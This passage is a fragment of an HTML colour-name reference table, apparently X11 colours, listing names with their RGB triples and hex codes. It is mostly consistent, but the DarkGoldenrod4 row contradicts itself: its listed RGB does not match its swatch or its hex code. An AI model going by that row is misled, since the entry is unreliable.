    <td style="background:rgb(240, 255, 255);"></td><td>Azure</td><td>240 255 255</td><td>#F0FFFF</td>
    <td style="background:rgb(127, 255, 212);"></td><td>Aquamarine1</td><td>127 255 212</td><td>#7FFFD4</td>
   </tr>
   <tr>
    <td style="background:rgb(240, 248, 255);"></td><td>AliceBlue</td><td>240 248 255</td><td>#F0F8FF</td>
    <td style="background:rgb(118, 238, 198);"></td><td>Aquamarine2</td><td>118 238 198</td><td>#76EEC6</td>
   </tr>
   <tr>
    <td style="background:rgb(230, 230, 250);"></td><td>lavender</td><td>230 230 250</td><td>#E6E6FA</td>
    <td style="background:rgb(102, 205, 170);"></td><td>Aquamarine3</td><td>102 205 170</td><td>#66CDAA</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 240, 245);"></td><td>LavenderBlush</td><td>255 240 245</td><td>#FFF0F5</td>
    <td style="background:rgb(69, 139, 116);"></td><td>Aquamarine4</td><td>69 139 116</td><td>#458B74</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 228, 225);"></td><td>MistyRose</td><td>255 228 225</td><td>#FFE4E1</td>
    <td style="background:rgb(193, 255, 193);"></td><td>DarkSeaGreen1</td><td>193 255 193</td><td>#C1FFC1</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 255, 255);"></td><td>White</td><td>255 255 255</td><td>#FFFFFF</td>
    <td style="background:rgb(180, 238, 180);"></td><td>DarkSeaGreen2</td><td>180 238 180</td><td>#B4EEB4</td>
   </tr>
   <tr>
    <td style="background:rgb(0, 0, 0);"></td><td>Black</td><td>0 0 0</td><td>#000000</td>
    <td style="background:rgb(155, 205, 155);"></td><td>DarkSeaGreen3</td><td>155 205 155</td><td>#9BCD9B</td>
   </tr>
   <tr>
    <td style="background:rgb(47, 79, 79);"></td><td>DarkSlateGray</td><td>47 79 79</td><td>#2F4F4F</td>
    <td style="background:rgb(105, 139, 105);"></td><td>DarkSeaGreen4</td><td>105 139 105</td><td>#698B69</td>
   </tr>
   <tr>
    <td style="background:rgb(105, 105, 105);"></td><td>DimGrey</td><td>105 105 105</td><td>#696969</td>
    <td style="background:rgb(84, 255, 159);"></td><td>SeaGreen1</td><td>84 255 159</td><td>#54FF9F</td>
   </tr>
   <tr>
    <td style="background:rgb(112, 128, 144);"></td><td>SlateGrey</td><td>112 128 144</td><td>#708090</td>
    <td style="background:rgb(78, 238, 148);"></td><td>SeaGreen2</td><td>78 238 148</td><td>#4EEE94</td>
   </tr>
   <tr>
    <td style="background:rgb(119, 136, 153);"></td><td>LightSlateGray</td><td>119 136 153</td><td>#778899</td>
    <td style="background:rgb(67, 205, 128);"></td><td>SeaGreen3</td><td>67 205 128</td><td>#43CD80</td>
   </tr>
   <tr>
    <td style="background:rgb(190, 190, 190);"></td><td>Grey</td><td>190 190 190</td><td>#BEBEBE</td>
    <td style="background:rgb(46, 139, 87);"></td><td>SeaGreen4</td><td>46 139 87</td><td>#2E8B57</td>
   </tr>
   <tr>
    <td style="background:rgb(211, 211, 211);"></td><td>LightGray</td><td>211 211 211</td><td>#D3D3D3</td>
    <td style="background:rgb(154, 255, 154);"></td><td>PaleGreen1</td><td>154 255 154</td><td>#9AFF9A</td>
   </tr>
   <tr>
    <td style="background:rgb(25, 25, 112);"></td><td>MidnightBlue</td><td>25 25 112</td><td>#191970</td>
    <td style="background:rgb(144, 238, 144);"></td><td>PaleGreen2</td><td>144 238 144</td><td>#90EE90</td>
   </tr>
   <tr>
    <td style="background:rgb(0, 0, 128);"></td><td>NavyBlue</td><td>0 0 128</td><td>#000080</td>
    <td style="background:rgb(124, 205, 124);"></td><td>PaleGreen3</td><td>124 205 124</td><td>#7CCD7C</td>
   </tr>
   <tr>
    <td style="background:rgb(100, 149, 237);"></td><td>CornflowerBlue</td><td>100 149 237</td><td>#6495ED</td>
    <td style="background:rgb(84, 139, 84);"></td><td>PaleGreen4</td><td>84 139 84</td><td>#548B54</td>
   </tr>
   <tr>
    <td style="background:rgb(72, 61, 139);"></td><td>DarkSlateBlue</td><td>72 61 139</td><td>#483D8B</td>
    <td style="background:rgb(0, 255, 127);"></td><td>SpringGreen1</td><td>0 255 127</td><td>#00FF7F</td>
   </tr>
   <tr>
    <td style="background:rgb(106, 90, 205);"></td><td>SlateBlue</td><td>106 90 205</td><td>#6A5ACD</td>
    <td style="background:rgb(0, 238, 118);"></td><td>SpringGreen2</td><td>0 238 118</td><td>#00EE76</td>
   </tr>
   <tr>
    <td style="background:rgb(123, 104, 238);"></td><td>MediumSlateBlue</td><td>123 104 238</td><td>#7B68EE</td>
    <td style="background:rgb(0, 205, 102);"></td><td>SpringGreen3</td><td>0 205 102</td><td>#00CD66</td>
   </tr>
   <tr>
    <td style="background:rgb(132, 112, 255);"></td><td>LightSlateBlue</td><td>132 112 255</td><td>#8470FF</td>
    <td style="background:rgb(0, 139, 69);"></td><td>SpringGreen4</td><td>0 139 69</td><td>#008B45</td>
   </tr>
   <tr>
    <td style="background:rgb(0, 0, 205);"></td><td>MediumBlue</td><td>0 0 205</td><td>#0000CD</td>
    <td style="background:rgb(0, 255, 0);"></td><td>Green1</td><td>0 255 0</td><td>#00FF00</td>
   </tr>
   <tr>
    <td style="background:rgb(65, 105, 225);"></td><td>RoyalBlue</td><td>65 105 225</td><td>#4169E1</td>
    <td style="background:rgb(0, 238, 0);"></td><td>Green2</td><td>0 238 0</td><td>#00EE00</td>
   </tr>
   <tr>
    <td style="background:rgb(0, 0, 255);"></td><td>Blue</td><td>0 0 255</td><td>#0000FF</td>
    <td style="background:rgb(0, 205, 0);"></td><td>Green3</td><td>0 205 0</td><td>#00CD00</td>
   </tr>
   <tr>
    <td style="background:rgb(30, 144, 255);"></td><td>DodgerBlue</td><td>30 144 255</td><td>#1E90FF</td>
    <td style="background:rgb(0, 139, 0);"></td><td>Green4</td><td>0 139 0</td><td>#008B00</td>
   </tr>
   <tr>
    <td style="background:rgb(0, 191, 255);"></td><td>DeepSkyBlue</td><td>0 191 255</td><td>#00BFFF</td>
    <td style="background:rgb(127, 255, 0);"></td><td>Chartreuse1</td><td>127 255 0</td><td>#7FFF00</td>
   </tr>
   <tr>
    <td style="background:rgb(135, 206, 235);"></td><td>SkyBlue</td><td>135 206 235</td><td>#87CEEB</td>
    <td style="background:rgb(118, 238, 0);"></td><td>Chartreuse2</td><td>118 238 0</td><td>#76EE00</td>
   </tr>
   <tr>
    <td style="background:rgb(135, 206, 250);"></td><td>LightSkyBlue</td><td>135 206 250</td><td>#87CEFA</td>
    <td style="background:rgb(102, 205, 0);"></td><td>Chartreuse3</td><td>102 205 0</td><td>#66CD00</td>
   </tr>
   <tr>
    <td style="background:rgb(70, 130, 180);"></td><td>SteelBlue</td><td>70 130 180</td><td>#4682B4</td>
    <td style="background:rgb(69, 139, 0);"></td><td>Chartreuse4</td><td>69 139 0</td><td>#458B00</td>
   </tr>
   <tr>
    <td style="background:rgb(176, 196, 222);"></td><td>LightSteelBlue</td><td>176 196 222</td><td>#B0C4DE</td>
    <td style="background:rgb(192, 255, 62);"></td><td>OliveDrab1</td><td>192 255 62</td><td>#C0FF3E</td>
   </tr>
   <tr>
    <td style="background:rgb(173, 216, 230);"></td><td>LightBlue</td><td>173 216 230</td><td>#ADD8E6</td>
    <td style="background:rgb(179, 238, 58);"></td><td>OliveDrab2</td><td>179 238 58</td><td>#B3EE3A</td>
   </tr>
   <tr>
    <td style="background:rgb(176, 224, 230);"></td><td>PowderBlue</td><td>176 224 230</td><td>#B0E0E6</td>
    <td style="background:rgb(154, 205, 50);"></td><td>OliveDrab3</td><td>154 205 50</td><td>#9ACD32</td>
   </tr>
   <tr>
    <td style="background:rgb(175, 238, 238);"></td><td>PaleTurquoise</td><td>175 238 238</td><td>#AFEEEE</td>
    <td style="background:rgb(105, 139, 34);"></td><td>OliveDrab4</td><td>105 139 34</td><td>#698B22</td>
   </tr>
   <tr>
    <td style="background:rgb(0, 206, 209);"></td><td>DarkTurquoise</td><td>0 206 209</td><td>#00CED1</td>
    <td style="background:rgb(202, 255, 112);"></td><td>DarkOliveGreen1</td><td>202 255 112</td><td>#CAFF70</td>
   </tr>
   <tr>
    <td style="background:rgb(72, 209, 204);"></td><td>MediumTurquoise</td><td>72 209 204</td><td>#48D1CC</td>
    <td style="background:rgb(188, 238, 104);"></td><td>DarkOliveGreen2</td><td>188 238 104</td><td>#BCEE68</td>
   </tr>
   <tr>
    <td style="background:rgb(64, 224, 208);"></td><td>Turquoise</td><td>64 224 208</td><td>#40E0D0</td>
    <td style="background:rgb(162, 205, 90);"></td><td>DarkOliveGreen3</td><td>162 205 90</td><td>#A2CD5A</td>
   </tr>
   <tr>
    <td style="background:rgb(0, 255, 255);"></td><td>Cyan</td><td>0 255 255</td><td>#00FFFF</td>
    <td style="background:rgb(110, 139, 61);"></td><td>DarkOliveGreen4</td><td>110 139 61</td><td>#6E8B3D</td>
   </tr>
   <tr>
    <td style="background:rgb(224, 255, 255);"></td><td>LightCyan</td><td>224 255 255</td><td>#E0FFFF</td>
    <td style="background:rgb(255, 246, 143);"></td><td>Khaki1</td><td>255 246 143</td><td>#FFF68F</td>
   </tr>
   <tr>
    <td style="background:rgb(95, 158, 160);"></td><td>CadetBlue</td><td>95 158 160</td><td>#5F9EA0</td>
    <td style="background:rgb(238, 230, 133);"></td><td>Khaki2</td><td>238 230 133</td><td>#EEE685</td>
   </tr>
   <tr>
    <td style="background:rgb(102, 205, 170);"></td><td>MediumAquamarine</td><td>102 205 170</td><td>#66CDAA</td>
    <td style="background:rgb(205, 198, 115);"></td><td>Khaki3</td><td>205 198 115</td><td>#CDC673</td>
   </tr>
   <tr>
    <td style="background:rgb(127, 255, 212);"></td><td>Aquamarine</td><td>127 255 212</td><td>#7FFFD4</td>
    <td style="background:rgb(139, 134, 78);"></td><td>Khaki4</td><td>139 134 78</td><td>#8B864E</td>
   </tr>
   <tr>
    <td style="background:rgb(0, 100, 0);"></td><td>DarkGreen</td><td>0 100 0</td><td>#006400</td>
    <td style="background:rgb(255, 236, 139);"></td><td>LightGoldenrod1</td><td>255 236 139</td><td>#FFEC8B</td>
   </tr>
   <tr>
    <td style="background:rgb(85, 107, 47);"></td><td>DarkOliveGreen</td><td>85 107 47</td><td>#556B2F</td>
    <td style="background:rgb(238, 220, 130);"></td><td>LightGoldenrod2</td><td>238 220 130</td><td>#EEDC82</td>
   </tr>
   <tr>
    <td style="background:rgb(143, 188, 143);"></td><td>DarkSeaGreen</td><td>143 188 143</td><td>#8FBC8F</td>
    <td style="background:rgb(205, 190, 112);"></td><td>LightGoldenrod3</td><td>205 190 112</td><td>#CDBE70</td>
   </tr>
   <tr>
    <td style="background:rgb(46, 139, 87);"></td><td>SeaGreen</td><td>46 139 87</td><td>#2E8B57</td>
    <td style="background:rgb(139, 129, 76);"></td><td>LightGoldenrod4</td><td>139 129 76</td><td>#8B814C</td>
   </tr>
   <tr>
    <td style="background:rgb(60, 179, 113);"></td><td>MediumSeaGreen</td><td>60 179 113</td><td>#3CB371</td>
    <td style="background:rgb(255, 255, 224);"></td><td>LightYellow1</td><td>255 255 224</td><td>#FFFFE0</td>
   </tr>
   <tr>
    <td style="background:rgb(32, 178, 170);"></td><td>LightSeaGreen</td><td>32 178 170</td><td>#20B2AA</td>
    <td style="background:rgb(238, 238, 209);"></td><td>LightYellow2</td><td>238 238 209</td><td>#EEEED1</td>
   </tr>
   <tr>
    <td style="background:rgb(152, 251, 152);"></td><td>PaleGreen</td><td>152 251 152</td><td>#98FB98</td>
    <td style="background:rgb(205, 205, 180);"></td><td>LightYellow3</td><td>205 205 180</td><td>#CDCDB4</td>
   </tr>
   <tr>
    <td style="background:rgb(0, 255, 127);"></td><td>SpringGreen</td><td>0 255 127</td><td>#00FF7F</td>
    <td style="background:rgb(139, 139, 122);"></td><td>LightYellow4</td><td>139 139 122</td><td>#8B8B7A</td>
   </tr>
   <tr>
    <td style="background:rgb(124, 252, 0);"></td><td>LawnGreen</td><td>124 252 0</td><td>#7CFC00</td>
    <td style="background:rgb(255, 255, 0);"></td><td>Yellow1</td><td>255 255 0</td><td>#FFFF00</td>
   </tr>
   <tr>
    <td style="background:rgb(0, 255, 0);"></td><td>Green</td><td>0 255 0</td><td>#00FF00</td>
    <td style="background:rgb(238, 238, 0);"></td><td>Yellow2</td><td>238 238 0</td><td>#EEEE00</td>
   </tr>
   <tr>
    <td style="background:rgb(127, 255, 0);"></td><td>Chartreuse</td><td>127 255 0</td><td>#7FFF00</td>
    <td style="background:rgb(205, 205, 0);"></td><td>Yellow3</td><td>205 205 0</td><td>#CDCD00</td>
   </tr>
   <tr>
    <td style="background:rgb(0, 250, 154);"></td><td>MedSpringGreen</td><td>0 250 154</td><td>#00FA9A</td>
    <td style="background:rgb(139, 139, 0);"></td><td>Yellow4</td><td>139 139 0</td><td>#8B8B00</td>
   </tr>
   <tr>
    <td style="background:rgb(173, 255, 47);"></td><td>GreenYellow</td><td>173 255 47</td><td>#ADFF2F</td>
    <td style="background:rgb(255, 215, 0);"></td><td>Gold1</td><td>255 215 0</td><td>#FFD700</td>
   </tr>
   <tr>
    <td style="background:rgb(50, 205, 50);"></td><td>LimeGreen</td><td>50 205 50</td><td>#32CD32</td>
    <td style="background:rgb(238, 201, 0);"></td><td>Gold2</td><td>238 201 0</td><td>#EEC900</td>
   </tr>
   <tr>
    <td style="background:rgb(154, 205, 50);"></td><td>YellowGreen</td><td>154 205 50</td><td>#9ACD32</td>
    <td style="background:rgb(205, 173, 0);"></td><td>Gold3</td><td>205 173 0</td><td>#CDAD00</td>
   </tr>
   <tr>
    <td style="background:rgb(34, 139, 34);"></td><td>ForestGreen</td><td>34 139 34</td><td>#228B22</td>
    <td style="background:rgb(139, 117, 0);"></td><td>Gold4</td><td>139 117 0</td><td>#8B7500</td>
   </tr>
   <tr>
    <td style="background:rgb(107, 142, 35);"></td><td>OliveDrab</td><td>107 142 35</td><td>#6B8E23</td>
    <td style="background:rgb(255, 193, 37);"></td><td>Goldenrod1</td><td>255 193 37</td><td>#FFC125</td>
   </tr>
   <tr>
    <td style="background:rgb(189, 183, 107);"></td><td>DarkKhaki</td><td>189 183 107</td><td>#BDB76B</td>
    <td style="background:rgb(238, 180, 34);"></td><td>Goldenrod2</td><td>238 180 34</td><td>#EEB422</td>
   </tr>
   <tr>
    <td style="background:rgb(238, 232, 170);"></td><td>PaleGoldenrod</td><td>238 232 170</td><td>#EEE8AA</td>
    <td style="background:rgb(205, 155, 29);"></td><td>Goldenrod3</td><td>205 155 29</td><td>#CD9B1D</td>
   </tr>
   <tr>
    <td style="background:rgb(250, 250, 210);"></td><td>LtGoldenrodYello</td><td>250 250 210</td><td>#FAFAD2</td>
    <td style="background:rgb(139, 105, 20);"></td><td>Goldenrod4</td><td>139 105 20</td><td>#8B6914</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 255, 224);"></td><td>LightYellow</td><td>255 255 224</td><td>#FFFFE0</td>
    <td style="background:rgb(255, 185, 15);"></td><td>DarkGoldenrod1</td><td>255 185 15</td><td>#FFB90F</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 255, 0);"></td><td>Yellow</td><td>255 255 0</td><td>#FFFF00</td>
    <td style="background:rgb(238, 173, 14);"></td><td>DarkGoldenrod2</td><td>238 173 14</td><td>#EEAD0E</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 215, 0);"></td><td>Gold</td><td>255 215 0</td><td>#FFD700</td>
    <td style="background:rgb(205, 149, 12);"></td><td>DarkGoldenrod3</td><td>205 149 12</td><td>#CD950C</td>
   </tr>
   <tr>
    <td style="background:rgb(238, 221, 130);"></td><td>LightGoldenrod</td><td>238 221 130</td><td>#EEDD82</td>
    <td style="background:rgb(139, 101, 139);"></td><td>DarkGoldenrod4</td><td>139 101 8</td><td>#8B658B</td>
   </tr>
   <tr>
    <td style="background:rgb(218, 165, 32);"></td><td>goldenrod</td><td>218 165 32</td><td>#DAA520</td>
    <td style="background:rgb(255, 193, 193);"></td><td>RosyBrown1</td><td>255 193 193</td><td>#FFC1C1</td>
   </tr>
   <tr>
    <td style="background:rgb(184, 134, 11);"></td><td>DarkGoldenrod</td><td>184 134 11</td><td>#B8860B</td>
    <td style="background:rgb(238, 180, 180);"></td><td>RosyBrown2</td><td>238 180 180</td><td>#EEB4B4</td>
   </tr>
   <tr>
    <td style="background:rgb(188, 143, 143);"></td><td>RosyBrown</td><td>188 143 143</td><td>#BC8F8F</td>
    <td style="background:rgb(205, 155, 155);"></td><td>RosyBrown3</td><td>205 155 155</td><td>#CD9B9B</td>
   </tr>
   <tr>
    <td style="background:rgb(205, 92, 92);"></td><td>IndianRed</td><td>205 92 92</td><td>#CD5C5C</td>
    <td style="background:rgb(139, 105, 105);"></td><td>RosyBrown4</td><td>139 105 105</td><td>#8B6969</td>
   </tr>
   <tr>
    <td style="background:rgb(139, 69, 19);"></td><td>SaddleBrown</td><td>139 69 19</td><td>#8B4513</td>
    <td style="background:rgb(255, 106, 106);"></td><td>IndianRed1</td><td>255 106 106</td><td>#FF6A6A</td>
   </tr>
   <tr>
    <td style="background:rgb(160, 82, 45);"></td><td>Sienna</td><td>160 82 45</td><td>#A0522D</td>
    <td style="background:rgb(238, 99, 99);"></td><td>IndianRed2</td><td>238 99 99</td><td>#EE6363</td>
   </tr>
   <tr>
    <td style="background:rgb(205, 133, 63);"></td><td>Peru</td><td>205 133 63</td><td>#CD853F</td>
    <td style="background:rgb(205, 85, 85);"></td><td>IndianRed3</td><td>205 85 85</td><td>#CD5555</td>
   </tr>
   <tr>
    <td style="background:rgb(222, 184, 135);"></td><td>Burlywood</td><td>222 184 135</td><td>#DEB887</td>
    <td style="background:rgb(139, 58, 58);"></td><td>IndianRed4</td><td>139 58 58</td><td>#8B3A3A</td>
   </tr>
   <tr>
    <td style="background:rgb(245, 245, 220);"></td><td>Beige</td><td>245 245 220</td><td>#F5F5DC</td>
    <td style="background:rgb(255, 130, 71);"></td><td>Sienna1</td><td>255 130 71</td><td>#FF8247</td>
   </tr>
   <tr>
    <td style="background:rgb(245, 222, 179);"></td><td>Wheat</td><td>245 222 179</td><td>#F5DEB3</td>
    <td style="background:rgb(238, 121, 66);"></td><td>Sienna2</td><td>238 121 66</td><td>#EE7942</td>
   </tr>
   <tr>
    <td style="background:rgb(244, 164, 96);"></td><td>SandyBrown</td><td>244 164 96</td><td>#F4A460</td>
    <td style="background:rgb(205, 104, 57);"></td><td>Sienna3</td><td>205 104 57</td><td>#CD6839</td>
   </tr>
   <tr>
    <td style="background:rgb(210, 180, 140);"></td><td>Tan</td><td>210 180 140</td><td>#D2B48C</td>
    <td style="background:rgb(139, 71, 38);"></td><td>Sienna4</td><td>139 71 38</td><td>#8B4726</td>
   </tr>
   <tr>
    <td style="background:rgb(210, 105, 30);"></td><td>Chocolate</td><td>210 105 30</td><td>#D2691E</td>
    <td style="background:rgb(255, 211, 155);"></td><td>Burlywood1</td><td>255 211 155</td><td>#FFD39B</td>
   </tr>
   <tr>
    <td style="background:rgb(178, 34, 34);"></td><td>Firebrick</td><td>178 34 34</td><td>#B22222</td>
    <td style="background:rgb(238, 197, 145);"></td><td>Burlywood2</td><td>238 197 145</td><td>#EEC591</td>
   </tr>
   <tr>
    <td style="background:rgb(165, 42, 42);"></td><td>Brown</td><td>165 42 42</td><td>#A52A2A</td>
    <td style="background:rgb(205, 170, 125);"></td><td>Burlywood3</td><td>205 170 125</td><td>#CDAA7D</td>
   </tr>
   <tr>
    <td style="background:rgb(233, 150, 122);"></td><td>DarkSalmon</td><td>233 150 122</td><td>#E9967A</td>
    <td style="background:rgb(139, 115, 85);"></td><td>Burlywood4</td><td>139 115 85</td><td>#8B7355</td>
   </tr>
   <tr>
    <td style="background:rgb(250, 128, 114);"></td><td>Salmon</td><td>250 128 114</td><td>#FA8072</td>
    <td style="background:rgb(255, 231, 186);"></td><td>Wheat1</td><td>255 231 186</td><td>#FFE7BA</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 160, 122);"></td><td>LightSalmon</td><td>255 160 122</td><td>#FFA07A</td>
    <td style="background:rgb(238, 216, 174);"></td><td>Wheat2</td><td>238 216 174</td><td>#EED8AE</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 165, 0);"></td><td>Orange</td><td>255 165 0</td><td>#FFA500</td>
    <td style="background:rgb(205, 186, 150);"></td><td>Wheat3</td><td>205 186 150</td><td>#CDBA96</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 140, 0);"></td><td>DarkOrange</td><td>255 140 0</td><td>#FF8C00</td>
    <td style="background:rgb(139, 126, 102);"></td><td>Wheat4</td><td>139 126 102</td><td>#8B7E66</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 127, 80);"></td><td>Coral</td><td>255 127 80</td><td>#FF7F50</td>
    <td style="background:rgb(255, 165, 79);"></td><td>Tan1</td><td>255 165 79</td><td>#FFA54F</td>
   </tr>
   <tr>
    <td style="background:rgb(240, 128, 128);"></td><td>LightCoral</td><td>240 128 128</td><td>#F08080</td>
    <td style="background:rgb(238, 154, 73);"></td><td>Tan2</td><td>238 154 73</td><td>#EE9A49</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 99, 71);"></td><td>Tomato</td><td>255 99 71</td><td>#FF6347</td>
    <td style="background:rgb(205, 133, 63);"></td><td>Tan3</td><td>205 133 63</td><td>#CD853F</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 69, 0);"></td><td>OrangeRed</td><td>255 69 0</td><td>#FF4500</td>
    <td style="background:rgb(139, 90, 43);"></td><td>Tan4</td><td>139 90 43</td><td>#8B5A2B</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 0, 0);"></td><td>Red</td><td>255 0 0</td><td>#FF0000</td>
    <td style="background:rgb(255, 127, 36);"></td><td>Chocolate1</td><td>255 127 36</td><td>#FF7F24</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 105, 180);"></td><td>HotPink</td><td>255 105 180</td><td>#FF69B4</td>
    <td style="background:rgb(238, 118, 33);"></td><td>Chocolate2</td><td>238 118 33</td><td>#EE7621</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 20, 147);"></td><td>DeepPink</td><td>255 20 147</td><td>#FF1493</td>
    <td style="background:rgb(205, 102, 29);"></td><td>Chocolate3</td><td>205 102 29</td><td>#CD661D</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 192, 203);"></td><td>Pink</td><td>255 192 203</td><td>#FFC0CB</td>
    <td style="background:rgb(139, 69, 19);"></td><td>Chocolate4</td><td>139 69 19</td><td>#8B4513</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 182, 193);"></td><td>LightPink</td><td>255 182 193</td><td>#FFB6C1</td>
    <td style="background:rgb(255, 48, 48);"></td><td>Firebrick1</td><td>255 48 48</td><td>#FF3030</td>
   </tr>
   <tr>
    <td style="background:rgb(219, 112, 147);"></td><td>PaleVioletRed</td><td>219 112 147</td><td>#DB7093</td>
    <td style="background:rgb(238, 44, 44);"></td><td>Firebrick2</td><td>238 44 44</td><td>#EE2C2C</td>
   </tr>
   <tr>
    <td style="background:rgb(176, 48, 96);"></td><td>Maroon</td><td>176 48 96</td><td>#B03060</td>
    <td style="background:rgb(205, 38, 38);"></td><td>Firebrick3</td><td>205 38 38</td><td>#CD2626</td>
   </tr>
   <tr>
    <td style="background:rgb(199, 21, 133);"></td><td>MediumVioletRed</td><td>199 21 133</td><td>#C71585</td>
    <td style="background:rgb(139, 26, 26);"></td><td>Firebrick4</td><td>139 26 26</td><td>#8B1A1A</td>
   </tr>
   <tr>
    <td style="background:rgb(208, 32, 144);"></td><td>VioletRed</td><td>208 32 144</td><td>#D02090</td>
    <td style="background:rgb(255, 64, 64);"></td><td>Brown1</td><td>255 64 64</td><td>#FF4040</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 0, 255);"></td><td>Magenta</td><td>255 0 255</td><td>#FF00FF</td>
    <td style="background:rgb(238, 59, 59);"></td><td>Brown2</td><td>238 59 59</td><td>#EE3B3B</td>
   </tr>
   <tr>
    <td style="background:rgb(238, 130, 238);"></td><td>Violet</td><td>238 130 238</td><td>#EE82EE</td>
    <td style="background:rgb(205, 51, 51);"></td><td>Brown3</td><td>205 51 51</td><td>#CD3333</td>
   </tr>
   <tr>
    <td style="background:rgb(221, 160, 221);"></td><td>Plum</td><td>221 160 221</td><td>#DDA0DD</td>
    <td style="background:rgb(139, 35, 35);"></td><td>Brown4</td><td>139 35 35</td><td>#8B2323</td>
   </tr>
   <tr>
    <td style="background:rgb(218, 112, 214);"></td><td>Orchid</td><td>218 112 214</td><td>#DA70D6</td>
    <td style="background:rgb(255, 140, 105);"></td><td>Salmon1</td><td>255 140 105</td><td>#FF8C69</td>
   </tr>
   <tr>
    <td style="background:rgb(186, 85, 211);"></td><td>MediumOrchid</td><td>186 85 211</td><td>#BA55D3</td>
    <td style="background:rgb(238, 130, 98);"></td><td>Salmon2</td><td>238 130 98</td><td>#EE8262</td>
   </tr>
   <tr>
    <td style="background:rgb(153, 50, 204);"></td><td>DarkOrchid</td><td>153 50 204</td><td>#9932CC</td>
    <td style="background:rgb(205, 112, 84);"></td><td>Salmon3</td><td>205 112 84</td><td>#CD7054</td>
   </tr>
   <tr>
    <td style="background:rgb(148, 0, 211);"></td><td>DarkViolet</td><td>148 0 211</td><td>#9400D3</td>
    <td style="background:rgb(139, 76, 57);"></td><td>Salmon4</td><td>139 76 57</td><td>#8B4C39</td>
   </tr>
   <tr>
    <td style="background:rgb(138, 43, 226);"></td><td>BlueViolet</td><td>138 43 226</td><td>#8A2BE2</td>
    <td style="background:rgb(255, 160, 122);"></td><td>LightSalmon1</td><td>255 160 122</td><td>#FFA07A</td>
   </tr>
   <tr>
    <td style="background:rgb(160, 32, 240);"></td><td>Purple</td><td>160 32 240</td><td>#A020F0</td>
    <td style="background:rgb(238, 149, 114);"></td><td>LightSalmon2</td><td>238 149 114</td><td>#EE9572</td>
   </tr>
   <tr>
    <td style="background:rgb(147, 112, 219);"></td><td>MediumPurple</td><td>147 112 219</td><td>#9370DB</td>
    <td style="background:rgb(205, 129, 98);"></td><td>LightSalmon3</td><td>205 129 98</td><td>#CD8162</td>
   </tr>
   <tr>
    <td style="background:rgb(216, 191, 216);"></td><td>Thistle</td><td>216 191 216</td><td>#D8BFD8</td>
    <td style="background:rgb(139, 87, 66);"></td><td>LightSalmon4</td><td>139 87 66</td><td>#8B5742</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 250, 250);"></td><td>Snow1</td><td>255 250 250</td><td>#FFFAFA</td>
    <td style="background:rgb(255, 165, 0);"></td><td>Orange1</td><td>255 165 0</td><td>#FFA500</td>
   </tr>
   <tr>
    <td style="background:rgb(238, 233, 233);"></td><td>Snow2</td><td>238 233 233</td><td>#EEE9E9</td>
    <td style="background:rgb(238, 154, 0);"></td><td>Orange2</td><td>238 154 0</td><td>#EE9A00</td>
   </tr>
   <tr>
    <td style="background:rgb(205, 201, 201);"></td><td>Snow3</td><td>205 201 201</td><td>#CDC9C9</td>
    <td style="background:rgb(205, 133, 0);"></td><td>Orange3</td><td>205 133 0</td><td>#CD8500</td>
   </tr>
   <tr>
    <td style="background:rgb(139, 137, 137);"></td><td>Snow4</td><td>139 137 137</td><td>#8B8989</td>
    <td style="background:rgb(139, 90, 0);"></td><td>Orange4</td><td>139 90 0</td><td>#8B5A00</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 245, 238);"></td><td>Seashell1</td><td>255 245 238</td><td>#FFF5EE</td>
    <td style="background:rgb(255, 127, 0);"></td><td>DarkOrange1</td><td>255 127 0</td><td>#FF7F00</td>
   </tr>
   <tr>
    <td style="background:rgb(238, 229, 222);"></td><td>Seashell2</td><td>238 229 222</td><td>#EEE5DE</td>
    <td style="background:rgb(238, 118, 0);"></td><td>DarkOrange2</td><td>238 118 0</td><td>#EE7600</td>
   </tr>
   <tr>
    <td style="background:rgb(205, 197, 191);"></td><td>Seashell3</td><td>205 197 191</td><td>#CDC5BF</td>
    <td style="background:rgb(205, 102, 0);"></td><td>DarkOrange3</td><td>205 102 0</td><td>#CD6600</td>
   </tr>
   <tr>
    <td style="background:rgb(139, 134, 130);"></td><td>Seashell4</td><td>139 134 130</td><td>#8B8682</td>
    <td style="background:rgb(139, 69, 0);"></td><td>DarkOrange4</td><td>139 69 0</td><td>#8B4500</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 239, 219);"></td><td>AntiqueWhite1</td><td>255 239 219</td><td>#FFEFDB</td>
    <td style="background:rgb(255, 114, 86);"></td><td>Coral1</td><td>255 114 86</td><td>#FF7256</td>
   </tr>
   <tr>
    <td style="background:rgb(238, 223, 204);"></td><td>AntiqueWhite2</td><td>238 223 204</td><td>#EEDFCC</td>
    <td style="background:rgb(238, 106, 80);"></td><td>Coral2</td><td>238 106 80</td><td>#EE6A50</td>
   </tr>
   <tr>
    <td style="background:rgb(205, 192, 176);"></td><td>AntiqueWhite3</td><td>205 192 176</td><td>#CDC0B0</td>
    <td style="background:rgb(205, 91, 69);"></td><td>Coral3</td><td>205 91 69</td><td>#CD5B45</td>
   </tr>
   <tr>
    <td style="background:rgb(139, 131, 120);"></td><td>AntiqueWhite4</td><td>139 131 120</td><td>#8B8378</td>
    <td style="background:rgb(139, 62, 47);"></td><td>Coral4</td><td>139 62 47</td><td>#8B3E2F</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 228, 196);"></td><td>Bisque1</td><td>255 228 196</td><td>#FFE4C4</td>
    <td style="background:rgb(255, 99, 71);"></td><td>Tomato1</td><td>255 99 71</td><td>#FF6347</td>
   </tr>
   <tr>
    <td style="background:rgb(238, 213, 183);"></td><td>Bisque2</td><td>238 213 183</td><td>#EED5B7</td>
